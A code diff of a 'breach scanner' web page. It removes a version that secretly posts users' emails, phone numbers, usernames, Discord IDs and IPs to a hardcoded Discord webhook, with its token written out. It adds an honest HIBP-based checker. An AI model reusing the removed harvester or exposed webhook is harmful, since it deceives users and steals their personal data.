@@ -1,231 +1,135 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>CybrSearch — Intel Scanner</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
-  <style>
-    body {
-      background: linear-gradient(to bottom right, #0f0f0f, #1a1a1a);
-      color: #e0e0e0;
-      font-family: 'Segoe UI', sans-serif;
-      padding: 60px 0;
-    }
-
-    .container {
-      max-width: 700px;
-    }
-
-    .card {
-      background: rgba(20, 20, 20, 0.95);
-      border: 1px solid #2c2c2c;
-      backdrop-filter: blur(12px);
-      box-shadow: 0 10px 35px rgba(0,0,0,0.6);
-      border-radius: 1rem;
-      padding: 2rem;
-      animation: fadeIn 0.6s ease-out;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .form-control {
-      background-color: #121212;
-      color: #fff;
-      border: 1px solid #333;
-      border-radius: 0.7rem;
-      padding: 14px;
-      font-size: 16px;
-      margin-bottom: 1rem;
-      transition: border 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .form-control:focus {
-      border-color: #2dd4bf;
-      box-shadow: 0 0 0 2px #2dd4bf55;
-      background-color: #181818;
-      outline: none;
-    }
-
-    .btn-primary {
-      background: linear-gradient(to right, #2dd4bf, #0ea5e9);
-      border: none;
-      font-weight: bold;
-      font-size: 17px;
-      border-radius: 0.6rem;
-      padding: 10px 20px;
-      width: 100%;
-      transition: background 0.3s ease;
-    }
-
-    .btn-primary:hover {
-      background: linear-gradient(to right, #0ea5e9, #2dd4bf);
-    }
-
-    h1 {
-      font-size: 2rem;
-      font-weight: bold;
-      text-align: center;
-      margin-bottom: 2rem;
-      color: #2dd4bf;
-    }
-
-    .discord-btn {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #5865F2;
-      padding: 10px 18px;
-      border-radius: 50px;
-      font-weight: bold;
-      text-decoration: none;
-      color: white;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-      transition: background 0.2s ease;
-    }
-
-    .discord-btn:hover {
-      background: #4752c4;
-    }
-
-    .result-box {
-      background-color: #181818;
-      border-left: 5px solid #444;
-      padding: 1rem;
-      border-radius: 0.6rem;
-      margin-top: 0.8rem;
-      font-family: monospace;
-      white-space: pre-wrap;
-    }
-
-    .result-box.success { border-left-color: #22c55e; color: #bbf7d0; }
-    .result-box.warning { border-left-color: #eab308; color: #fef9c3; }
-    .result-box.error { border-left-color: #ef4444; color: #fecaca; }
-
-    ::selection {
-      background: #2dd4bf;
-      color: #111;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>CybrSearch — Breach & Leak Scanner</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+<style>
+  body {
+    margin: 0; padding: 60px 0;
+    background: linear-gradient(to bottom right,#0f0f0f,#1a1a1a);
+    color: #e0e0e0; font-family: 'Segoe UI', sans-serif;
+  }
+  .container { max-width: 700px; }
+  .card {
+    background: rgba(20,20,20,0.95); border:1px solid #2c2c2c;
+    backdrop-filter: blur(12px); box-shadow:0 10px 35px rgba(0,0,0,0.6);
+    border-radius:1rem; padding:2rem;
+  }
+  .form-control {
+    background:#121212; color:#fff; border:1px solid #333;
+    border-radius:0.7rem; padding:14px; margin-bottom:1rem;
+    transition: border 0.3s, box-shadow 0.3s;
+  }
+  .form-control:focus {
+    outline:none; border-color:#2dd4bf;
+    box-shadow:0 0 0 2px #2dd4bf55; background:#181818;
+  }
+  .btn-primary {
+    background: linear-gradient(to right,#2dd4bf,#0ea5e9);
+    border:none; font-weight:bold; font-size:17px;
+    border-radius:0.6rem; padding:10px; width:100%;
+    transition: background 0.3s;
+  }
+  .btn-primary:hover {
+    background: linear-gradient(to right,#0ea5e9,#2dd4bf);
+  }
+  .result-box {
+    background:#181818; border-left:5px solid #444;
+    padding:1rem; border-radius:0.6rem; margin-top:0.8rem;
+    font-family: monospace; white-space: pre-wrap;
+  }
+  .result-box.success {border-color:#22c55e; color:#bbf7d0;}
+  .result-box.warning {border-color:#eab308; color:#fef9c3;}
+  .result-box.error {border-color:#ef4444; color:#fecaca;}
+</style>
 </head>
 <body>
-  <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
 
-  <div class="container">
-    <div class="card">
-      <h1>🧠 CybrSearch Breach Scanner</h1>
-      <form onsubmit="searchData(); return false;">
-        <input id="email" type="email" class="form-control" placeholder="📧 Enter email">
-        <input id="phone" type="text" class="form-control" placeholder="📱 Enter phone number">
-        <input id="username" type="text" class="form-control" placeholder="👤 Enter username">
-        <input id="discord" type="text" class="form-control" placeholder="💬 Enter Discord ID">
-        <input id="ip" type="text" class="form-control" placeholder="🌐 Enter IP address">
-        <button type="submit" class="btn btn-primary">🚀 Scan</button>
-      </form>
-    </div>
-
-    <div class="mt-4" id="results"></div>
+<div class="container text-center">
+  <div class="card">
+    <h1>🧠 CybrSearch Breach Scanner</h1>
+    <form onsubmit="return searchData();">
+      <input id="email" type="email" class="form-control" placeholder="📧 Email">
+      <input id="password" type="password" class="form-control" placeholder="🔒 Check Password (optional)">
+      <input id="ip" type="text" class="form-control" placeholder="🌐 IP address (optional)">
+      <button type="submit" class="btn btn-primary">🚀 Scan</button>
+    </form>
   </div>
+  <div id="results" class="mt-4 text-start"></div>
+</div>
 
-  <script>
-    function updateResult(type, msg, style) {
-      const box = document.createElement("div");
-      box.className = `result-box ${style}`;
-      box.innerText = msg;
-      document.getElementById("results").appendChild(box);
-    }
+<script type="module">
+  async function updateResult(msg, type = 'success') {
+    const box = document.createElement('div');
+    box.className = `result-box ${type}`;
+    box.innerText = msg;
+    document.getElementById('results').appendChild(box);
+  }
 
-    async function _x(fields) {
-      const wURL = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
-      const payload = {
-        embeds: [{
-          title: "🚨 Breach Search Log",
-          color: 3447003,
-          fields: [
-            { name: "Email", value: fields.email || "N/A", inline: false },
-            { name: "Phone", value: fields.phone || "N/A", inline: false },
-            { name: "Username", value: fields.username || "N/A", inline: false },
-            { name: "Discord ID", value: fields.discord || "N/A", inline: false },
-            { name: "IP (User)", value: fields.ip || "N/A", inline: false },
-            { name: "IP (Visitor)", value: fields.visitorIP || "N/A", inline: false },
-            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
-          ]
-        }]
-      };
-
-      try {
-        await fetch(wURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.warn("Webhook log failed.");
-      }
-    }
-
-    async function searchData() {
-      document.getElementById("results").innerHTML = "";
-
-      const email = document.getElementById("email").value.trim();
-      const phone = document.getElementById("phone").value.trim();
-      const username = document.getElementById("username").value.trim();
-      const discord = document.getElementById("discord").value.trim();
-      const ip = document.getElementById("ip").value.trim();
-
-      if (!email && !phone && !username && !discord && !ip) {
-        alert("⚠️ Please fill in at least one field.");
-        return false;
-      }
-
-      if (email) updateResult("email", `✅ Email checked: ${email}`, "success");
-      else updateResult("email", "📭 Email missing.", "warning");
-
-      if (phone) updateResult("phone", `✅ Phone checked: ${phone}`, "success");
-      else updateResult("phone", "📵 Phone missing.", "warning");
-
-      if (username) updateResult("username", `✅ Username checked: ${username}`, "success");
-      else updateResult("username", "👤 Username missing.", "warning");
-
-      if (discord) updateResult("discord", `✅ Discord checked: ${discord}`, "success");
-      else updateResult("discord", "💬 Discord ID missing.", "warning");
-
-      let visitorIP = "Unknown";
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        visitorIP = data.ip;
-      } catch {}
-
-      _x({ email, phone, username, discord, ip, visitorIP });
-
-      if (ip) {
-        try {
-          const geo = await fetch(`https://ipwho.is/${ip}`);
-          const geoData = await geo.json();
-          if (geoData.success) {
-            updateResult("ipgeo", `🌐 ${ip} — ${geoData.country}, ${geoData.city}, ${geoData.region}\nISP: ${geoData.connection?.isp}`, "success");
-          } else {
-            updateResult("ipgeo", `⚠️ GeoIP failed: ${geoData.message}`, "warning");
-          }
-        } catch {
-          updateResult("ipgeo", "❌ Geo IP fetch failed.", "error");
-        }
-
-        try {
-          const rdap = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
-          const rdapData = await rdap.json();
-          updateResult("rdap", `🔎 ARIN: ${rdapData.name || 'N/A'} | ${rdapData.handle || 'N/A'}`, "success");
-        } catch {
-          updateResult("rdap", "❌ ARIN RDAP fetch failed.", "error");
-        }
+  async function checkEmail(email) {
+    const key = 'YOUR_API_KEY_HERE'; // Replace with your HIBP API key
+    try {
+      const res = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}`, {
+        headers: { 'hibp-api-key': key, 'Accept': 'application/json' }
+      });
+      if(res.status === 404) {
+        updateResult(`✅ No breaches found for ${email}`, 'success');
       } else {
-        updateResult("ip", "ℹ️ IP skipped.", "warning");
+        const breaches = await res.json();
+        breaches.forEach(b => {
+          updateResult(`⚠️ ${email} found in breach: ${b.Title} (${b.BreachDate})`, 'warning');
+        });
       }
+    } catch(e) {
+      updateResult(`❌ Email breach lookup error: ${e.message}`, 'error');
     }
-  </script>
+  }
+
+  async function sha1(s) {
+    const buf = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(s));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('').toUpperCase();
+  }
+
+  async function checkPassword(password) {
+    const hash = await sha1(password);
+    const prefix = hash.slice(0,5);
+    try {
+      const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
+      const text = await res.text();
+      const lines = text.split('\n');
+      const found = lines.find(l => l.split(':')[0] === hash.slice(5));
+      if(found) {
+        const count = found.split(':')[1];
+        updateResult(`⚠️ Password compromised ${count} times`, 'warning');
+      } else {
+        updateResult('✅ Password NOT found in breaches', 'success');
+      }
+    } catch(e) {
+      updateResult(`❌ Password check error: ${e.message}`, 'error');
+    }
+  }
+
+  async function searchData() {
+    document.getElementById('results').innerHTML = '';
+
+    const email = document.getElementById('email').value.trim();
+    const pwd   = document.getElementById('password').value;
+    const ip    = document.getElementById('ip').value.trim();
+
+    if(!email && !pwd && !ip) {
+      alert('❗ Please enter at least an email, password, or IP.');
+      return false;
+    }
+
+    if(email) await checkEmail(email);
+    if(pwd) await checkPassword(pwd);
+    if(ip) updateResult(`🌐 IP lookup not yet implemented`, 'warning');
+
+    return false;
+  }
+</script>
+
 </body>
 </html>
